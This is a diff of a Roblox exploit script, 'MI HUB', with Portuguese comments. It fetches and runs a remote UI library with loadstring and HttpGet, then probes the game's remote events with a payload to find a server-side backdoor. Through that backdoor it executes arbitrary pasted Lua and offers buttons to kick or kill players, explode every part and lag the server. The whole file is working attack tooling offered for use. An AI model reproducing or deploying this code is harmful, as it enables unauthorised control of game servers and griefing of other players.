@@ -1,205 +1,237 @@
 -- language: Lua, target: Roblox
+-- MI HUB AURA EDITION - Scanner + Executor + Painel de Comandos
+
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LP = Players.LocalPlayer
 
+-- Carrega a Lib AURA
 local Aura = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sync7771/lib-test/refs/heads/main/AURA%20HUB"))()
 
--- 1. CRIA A JANELA DE SCAN
-local scanWin = Aura:CreateWindow({
-    Title = "MI HUB | SCANNING", 
-    Subtitle = "Procurando Backdoor...",
+-- Cria a Janela Principal
+local win = Aura:CreateWindow({
+    Title = "MI HUB | HELL", 
+    Subtitle = "Scanner & Executor",
     Theme = "HighContrast", 
-    Size = Vector2.new(400, 200),
+    Size = Vector2.new(650, 500),
     ToggleKey = Enum.KeyCode.RightControl
 })
-scanWin:SetTitleGradient({From = "#FF0000", To = "#8B0000", Rotation = 45})
-scanWin:SetAccent(Color3.fromRGB(255, 0, 0))
-local scanTab = scanWin:CreateTab({Name = "Scan", Icon = "search"})
-local statusLabel = scanTab:CreateLabel({Name = "Iniciando varredura..."})
+win:SetTitleGradient({From = "#FF0000", To = "#8B0000", Rotation = 45})
+win:SetFloatingButton({Text = "MI", Size = 50, TextColor = Color3.fromRGB(255, 0, 0)})
+win:SetAccent(Color3.fromRGB(255, 0, 0))
 
 local backdoorRemote = nil
+local selectedTarget = ""
 
--- 2. FUNÇÃO DE SCAN (Idêntica ao MI HUB original)
-local function scanRemotes()
-    local remotes = {}
-    local seen = {}
-    local function scan(obj)
-        if not obj or seen[obj] then return end
-        seen[obj] = true
-        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-            table.insert(remotes, obj)
-        end
-        for _, c in ipairs(obj:GetChildren()) do pcall(scan, c) end
-    end
-    pcall(scan, ReplicatedStorage)
-    pcall(scan, LP)
-    pcall(scan, workspace)
+-- ABA 1: SCANNER / EXECUTOR
+local tabExec = win:CreateTab({Name = "Executor", Icon = "terminal"})
+local statusLabel = tabExec:CreateLabel({Name = "Status: Aguardando INJECT..."})
 
-    if #remotes == 0 then return nil, "Nenhum remote encontrado." end
-
-    local codeMap = {}
-    local function randomName()
-        local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-        local out = {}
-        for i = 1, 12 do
-            local n = math.random(1, #chars)
-            out[i] = chars:sub(n, n)
-        end
-        return table.concat(out)
-    end
-
-    -- Envia o payload do MI HUB
-    for _, r in ipairs(remotes) do
-        local code = randomName()
-        codeMap[code] = r
-        local payload = "a=Instance.new('Model',workspace)a.Name='" .. code .. "'"
-        pcall(function()
-            if r:IsA("RemoteEvent") then r:FireServer(payload) else r:InvokeServer(payload) end
-        end)
-        task.wait()
-    end
-
-    -- Checa 100 vezes se o Model apareceu
-    for cycle = 1, 100 do
-        for code, remote in pairs(codeMap) do
-            if workspace:FindFirstChild(code) then
-                pcall(function() workspace[code]:Destroy() end)
-                return remote, "Backdoor Encontrada!"
+tabExec:CreateButton({
+    Name = "INJECT (Scan Remotes)",
+    Icon = "search",
+    Callback = function()
+        statusLabel:Set("Status: Escaneando remotes...")
+        
+        local remotes = {}
+        local seen = {}
+        local function scan(obj)
+            if not obj or seen[obj] then return end
+            seen[obj] = true
+            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+                table.insert(remotes, obj)
             end
+            for _, c in ipairs(obj:GetChildren()) do pcall(scan, c) end
         end
-        task.wait(0.1)
+        pcall(scan, ReplicatedStorage)
+        pcall(scan, LP)
+        pcall(scan, workspace)
+        
+        if #remotes == 0 then
+            statusLabel:Set("Status: Nenhum remote encontrado.")
+            win:Notify({Title = "Falha", Content = "Nenhum remote encontrado no jogo.", Duration = 5})
+            return
+        end
+
+        local codeMap = {}
+        local function randomName()
+            local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+            local out = {}
+            for i = 1, 16 do
+                local n = math.random(1, #chars)
+                out[i] = chars:sub(n, n)
+            end
+            return table.concat(out)
+        end
+
+        for _, r in ipairs(remotes) do
+            local code = randomName()
+            codeMap[code] = r
+            local payload = "a=Instance.new('Model',workspace)a.Name='" .. code .. "'"
+            pcall(function()
+                if r:IsA("RemoteEvent") then r:FireServer(payload) else r:InvokeServer(payload) end
+            end)
+            task.wait()
+        end
+
+        local found = false
+        for cycle = 1, 100 do
+            for code, remote in pairs(codeMap) do
+                if workspace:FindFirstChild(code) then
+                    found = true
+                    backdoorRemote = remote
+                    pcall(function() workspace[code]:Destroy() end)
+                    statusLabel:Set("Status: Backdoor Encontrada! (" .. remote.Name .. ")")
+                    win:Notify({Title = "Sucesso", Content = "Backdoor viva em: " .. remote:GetFullName(), Duration = 5})
+                    break
+                end
+            end
+            if found then break end
+            task.wait(0.1)
+        end
+
+        if not found then
+            statusLabel:Set("Status: Nenhuma backdoor respondeu.")
+            win:Notify({Title = "Falha", Content = "Nenhuma backdoor viva encontrada.", Duration = 5})
+        end
     end
+})
 
-    return nil, "Nenhuma backdoor respondeu ao payload."
-end
+local textBox = tabExec:CreateTextArea({
+    Name = "Script Code",
+    PlaceholderText = "-- Cole seu script Lua aqui (Executado localmente ou via backdoor)",
+    Height = 150,
+    MaxLength = 0
+})
 
--- 3. EXECUTA O SCAN E ABRE A GUI PRINCIPAL
-task.spawn(function()
-    statusLabel:Set("Enviando payloads...")
-    local foundRemote, msg = scanRemotes()
-    
-    if foundRemote then
-        backdoorRemote = foundRemote
-        statusLabel:Set("Sucesso: " .. msg)
-        scanWin:Notify({Title = "Sucesso", Content = "Backdoor achada em: " .. foundRemote:GetFullName(), Duration = 5})
-        
-        task.wait(2)
-        scanWin:Destroy()
-        
-        -- ==========================================
-        -- GUI PRINCIPAL (AURA)
-        -- ==========================================
-        local win = Aura:CreateWindow({
-            Title = "MI HUB | HELL", 
-            Subtitle = "Admin & Destruction",
-            Theme = "HighContrast", 
-            Size = Vector2.new(600, 500),
-            ToggleKey = Enum.KeyCode.RightControl
-        })
-        win:SetTitleGradient({From = "#FF0000", To = "#8B0000", Rotation = 45})
-        win:SetFloatingButton({Text = "MI", Size = 50, TextColor = Color3.fromRGB(255, 0, 0)})
-        win:SetAccent(Color3.fromRGB(255, 0, 0))
+tabExec:CreateButton({
+    Name = "EXECUTE",
+    Icon = "play",
+    Callback = function()
+        local src = textBox:Get()
+        if src == "" or src == nil then
+            win:Notify({Title = "Aviso", Content = "A textbox está vazia.", Duration = 3})
+            return
+        end
 
-        local selectedTarget = ""
-        local tabAdmin = win:CreateTab({Name = "Admin", Icon = "shield"})
-        local grpPlayer = tabAdmin:CreateGroup({Name = "Alvo", Description = "Escolha o alvo"})
-
-        grpPlayer:CreatePlayerList({
-            Name = "Jogadores",
-            Height = 120,
-            Multi = false,
-            Callback = function(player)
-                if player then selectedTarget = player.Name end
-            end
-        })
-        
-        grpPlayer:CreateButton({Name = "Selecionar Todos (ALL)", Icon = "users", Callback = function() 
-            selectedTarget = "ALL" 
-        end})
-
-        tabAdmin:CreateSpacer(10)
-        local grpAcoes = tabAdmin:CreateGroup({Name = "Ações (Via Backdoor)"})
-        
-        -- Função helper para mandar comando
-        local function sendCmd(cmd, args)
-            if not backdoorRemote then return end
-            local code = ""
-            if cmd == "kick" then
-                code = string.format([[
-                    local p = game.Players:FindFirstChild("%s") 
-                    if p then p:Kick("%s") end
-                ]], args.target, args.reason or "Kicked")
-            elseif cmd == "kill" then
-                code = string.format([[
-                    local p = game.Players:FindFirstChild("%s")
-                    if p and p.Character then p.Character:BreakJoints() end
-                ]], args.target)
-            elseif cmd == "explode" then
-                code = [[
-                    for _, v in ipairs(workspace:GetDescendants()) do
-                        if v:IsA("BasePart") then
-                            local ex = Instance.new("Explosion")
-                            ex.Position = v.Position
-                            ex.Parent = workspace
-                        end
-                    end
-                ]]
-            elseif cmd == "lag" then
-                code = [[
-                    for i = 1, 100 do
-                        task.spawn(function()
-                            local p = Instance.new("Part")
-                            p.Size = Vector3.new(100,100,100)
-                            p.Position = Vector3.new(math.random(-1000,1000), math.random(100,500), math.random(-1000,1000))
-                            p.Anchored = false
-                            p.Parent = workspace
-                            task.delay(3, function() if p then p:Destroy() end end)
-                        end)
-                    end
-                ]]
-            end
-            
+        -- 1. Tenta enviar via Backdoor (Server-Side)
+        if backdoorRemote then
             pcall(function()
                 if backdoorRemote:IsA("RemoteEvent") then
-                    backdoorRemote:FireServer(code)
+                    backdoorRemote:FireServer(src)
                 else
-                    backdoorRemote:InvokeServer(code)
+                    backdoorRemote:InvokeServer(src)
                 end
             end)
-            win:Notify({Title = "Executado", Content = "Comando enviado via backdoor.", Duration = 2})
+            win:Notify({Title = "Enviado", Content = "Script enviado via backdoor.", Duration = 2})
         end
 
-        grpAcoes:CreateButton({Name = "Kick Alvo", Icon = "user-x", Callback = function() 
-            if selectedTarget == "ALL" then
-                -- Kick local se não for server-side, mas se for, o backdoor processa
-                for _, p in ipairs(Players:GetPlayers()) do if p ~= LP then p:Kick("Kicked by MI HUB") end end
-            else
-                sendCmd("kick", {target = selectedTarget}) 
-            end
-        end})
+        -- 2. Roda localmente (Client-Side Fallback)
+        local func, err = loadstring(src, "=MI_HUB")
+        if not func then
+            win:Notify({Title = "Erro (Loadstring)", Content = tostring(err), Duration = 5})
+            return
+        end
         
-        grpAcoes:CreateButton({Name = "Matar Alvo", Icon = "skull", Callback = function() 
-            if selectedTarget == "ALL" then
-                for _, p in ipairs(Players:GetPlayers()) do if p ~= LP and p.Character then p.Character:BreakJoints() end end
-            else
-                sendCmd("kill", {target = selectedTarget}) 
-            end
-        end})
-
-        local tabServer = win:CreateTab({Name = "Server", Icon = "server"})
-        local grpServer = tabServer:CreateGroup({Name = "Destruição Server-Side"})
-
-        grpServer:CreateButton({Name = "Explodir Tudo", Icon = "bomb", Callback = function() 
-            sendCmd("explode") 
-        end})
+        if setfenv then pcall(setfenv, func, getfenv(0)) end
+        local ok, runErr = pcall(func)
         
-        grpServer:CreateButton({Name = "Lag Server", Icon = "zap", Callback = function()
-            sendCmd("lag")
-        end})
-
-    else
-        statusLabel:Set("Falha: " .. msg)
-        scanWin:Notify({Title = "Falha no Scan", Content = msg, Duration = 10})
+        if ok then
+            win:Notify({Title = "Executado", Content = "Script rodou localmente.", Duration = 3})
+        else
+            win:Notify({Title = "Erro (Runtime)", Content = tostring(runErr), Duration = 5})
+        end
     end
-end)
+})
+
+
+-- ABA 2: ADMIN (Usa a backdoor)
+local tabAdmin = win:CreateTab({Name = "Admin", Icon = "shield"})
+local grpPlayer = tabAdmin:CreateGroup({Name = "Alvo", Description = "Escolha o alvo"})
+
+grpPlayer:CreatePlayerList({
+    Name = "Jogadores",
+    Height = 120,
+    Multi = false,
+    Callback = function(player)
+        if player then selectedTarget = player.Name end
+    end
+})
+grpPlayer:CreateButton({Name = "Selecionar Todos (ALL)", Icon = "users", Callback = function() selectedTarget = "ALL" end})
+
+tabAdmin:CreateSpacer(10)
+local grpAcoes = tabAdmin:CreateGroup({Name = "Ações (Via Backdoor)"})
+
+local function sendCmd(cmd, args)
+    if not backdoorRemote then 
+        win:Notify({Title = "Aviso", Content = "Rode o INJECT primeiro!", Duration = 3})
+        return 
+    end
+    local code = ""
+    if cmd == "kick" then
+        code = string.format([[
+            local p = game.Players:FindFirstChild("%s") 
+            if p then p:Kick("%s") end
+        ]], args.target, args.reason or "Kicked")
+    elseif cmd == "kill" then
+        code = string.format([[
+            local p = game.Players:FindFirstChild("%s")
+            if p and p.Character then p.Character:BreakJoints() end
+        ]], args.target)
+    elseif cmd == "explode" then
+        code = [[
+            for _, v in ipairs(workspace:GetDescendants()) do
+                if v:IsA("BasePart") then
+                    local ex = Instance.new("Explosion")
+                    ex.Position = v.Position
+                    ex.Parent = workspace
+                end
+            end
+        ]]
+    elseif cmd == "lag" then
+        code = [[
+            for i = 1, 100 do
+                task.spawn(function()
+                    local p = Instance.new("Part")
+                    p.Size = Vector3.new(100,100,100)
+                    p.Position = Vector3.new(math.random(-1000,1000), math.random(100,500), math.random(-1000,1000))
+                    p.Anchored = false
+                    p.Parent = workspace
+                    task.delay(3, function() if p then p:Destroy() end end)
+                end)
+            end
+        ]]
+    end
+    
+    pcall(function()
+        if backdoorRemote:IsA("RemoteEvent") then
+            backdoorRemote:FireServer(code)
+        else
+            backdoorRemote:InvokeServer(code)
+        end
+    end)
+    win:Notify({Title = "Executado", Content = "Comando enviado.", Duration = 2})
+end
+
+grpAcoes:CreateButton({Name = "Kick Alvo", Icon = "user-x", Callback = function() 
+    if selectedTarget == "ALL" then
+        for _, p in ipairs(Players:GetPlayers()) do if p ~= LP then p:Kick("Kicked by MI HUB") end end
+    else
+        sendCmd("kick", {target = selectedTarget}) 
+    end
+end})
+grpAcoes:CreateButton({Name = "Matar Alvo", Icon = "skull", Callback = function() 
+    if selectedTarget == "ALL" then
+        for _, p in ipairs(Players:GetPlayers()) do if p ~= LP and p.Character then p.Character:BreakJoints() end end
+    else
+        sendCmd("kill", {target = selectedTarget}) 
+    end
+end})
+
+
+-- ABA 3: SERVER (Destruição)
+local tabServer = win:CreateTab({Name = "Server", Icon = "server"})
+local grpServer = tabServer:CreateGroup({Name = "Destruição Server-Side"})
+
+grpServer:CreateButton({Name = "Explodir Tudo", Icon = "bomb", Callback = function() sendCmd("explode") end})
+grpServer:CreateButton({Name = "Lag Server (Pesado)", Icon = "zap", Callback = function() sendCmd("lag") end})
